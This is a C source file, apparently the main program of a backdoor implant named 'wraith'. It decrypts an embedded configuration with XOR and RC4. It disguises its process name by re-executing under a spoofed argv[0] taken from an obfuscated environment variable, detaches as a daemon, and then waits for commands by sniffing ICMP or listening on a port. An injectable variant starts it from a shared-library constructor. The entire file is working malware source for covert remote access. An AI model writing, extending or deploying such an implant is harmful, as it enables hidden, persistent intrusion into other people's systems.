#include <pthread.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/resource.h>
#include <wraith.h>

struct wraith_config_block implant_config = {
    .mag0 = WRAITH_CONFIG_MAG0,
    .mag1 = WRAITH_CONFIG_MAG1,
    .mag2 = WRAITH_CONFIG_MAG2,
    .mag3 = WRAITH_CONFIG_MAG3,
    .configured = 0
};

__attribute__((always_inline))
static inline int
rc4_get_keystream(char *key, int len, uint8_t *S)
{
    int j = 0;

    for(int i = 0; i < 256; i++) {
        S[i] = i;
    }

    for(int i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % len]) % 256;

        int tmp = S[i];
        S[i] = S[j];
        S[j] = tmp;
    }

    return 0;
}

__attribute__((always_inline))
static inline int
rc4_encipher_blob(char *key, int keylen, char *plaintext, int len, uint8_t *ciphertext)
{
    unsigned char S[256];
    rc4_get_keystream(key, keylen, S);

    int i = 0;
    int j = 0;

    for (size_t n = 0; n < len; n++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;

        int tmp = S[i];

        S[i] = S[j];
        S[j] = tmp;

        int rnd = S[(S[i] + S[j]) % 256];

        ciphertext[n] = rnd ^ plaintext[n];
    }

    return 0;
}


__attribute__((always_inline))
static inline void
xor_decrypt(uint8_t *otp, uint8_t *indata, uint8_t *outdata, int len)
{
    for (int i = 0; i < len; i++) {
        outdata[i] = (otp[i] ^ indata[i]) & 0xFF;
    }
}

#ifdef DEBUG
static void
print_bytes(uint8_t *buf, int size)
{
    for (int i = 0; i < size; i++) {
        printf("%02x", (int)(buf[i] & 0xFF));
    }

    printf("\n");
}
#endif

void
close_all_other_files()
{
    struct rlimit lim;
    getrlimit(RLIMIT_NOFILE, &lim);
    for (int i = 3; i < lim.rlim_cur; i++) {
        close(i); 
    }
}

int
main(int argc, char *argv[])
{
    if (implant_config.configured == 0) {
        ERROR_PRINT("Implant was not configured. Bailing");
        return -1;
    }

#ifndef INJECTABLE
    /* You can spoof the argv[] by supplying a custom value inside the environmental variable _CMD! */
    char var_name[5];
    var_name[0] = '_';
    var_name[4] = '\0';
    var_name[1] = 'C';
    var_name[0] = '_';
    var_name[3] = 'D';
    var_name[2] = 'M';
#endif
    uint8_t rc4_key[32];

    xor_decrypt(implant_config.rc4_otp, implant_config.rc4_key, rc4_key, 32);
    rc4_encipher_blob(rc4_key, 32, (char*)&implant_config.encrypted_config, sizeof(struct wraith_config), (char*)&implant_config.encrypted_config);

#ifdef DEBUG
    print_bytes(rc4_key, 32);
    print_bytes(implant_config.encrypted_config.salsa20_psk, 16);
#endif

#ifndef INJECTABLE
    char *new_cmd = getenv(var_name);

    if (!new_cmd && implant_config.encrypted_config.command[0]) {
        new_cmd = implant_config.encrypted_config.command;
    }

    if (new_cmd && !getenv("_C")) {
        char *org_cmd = argv[0];
        argv[0] = new_cmd;
        setenv("_C", "1", 1);
        return execv(org_cmd, argv);
    }
#  ifndef DEBUG
    setsid();

    for (int fd = 0; fd < 1024; fd++) {
        close(fd);
    }

    daemon(0, 0);
#  endif
#endif

    if (implant_config.encrypted_config.listen_port == 0) {
        sniff_icmp();
    } else {
        perform_listen(1, implant_config.encrypted_config.listen_port);
    }

    return 0;
}


#ifdef INJECTABLE
static void
call_main()
{
    main(0, NULL);
}

__attribute__((constructor))
static void
load_library()
{
    pthread_t wraith_thread;

    if (pthread_create(&wraith_thread, NULL, (void *(*) (void *))call_main, NULL) == 0) {
        DEBUG_PRINT("Great success!");
    }
}
#endif
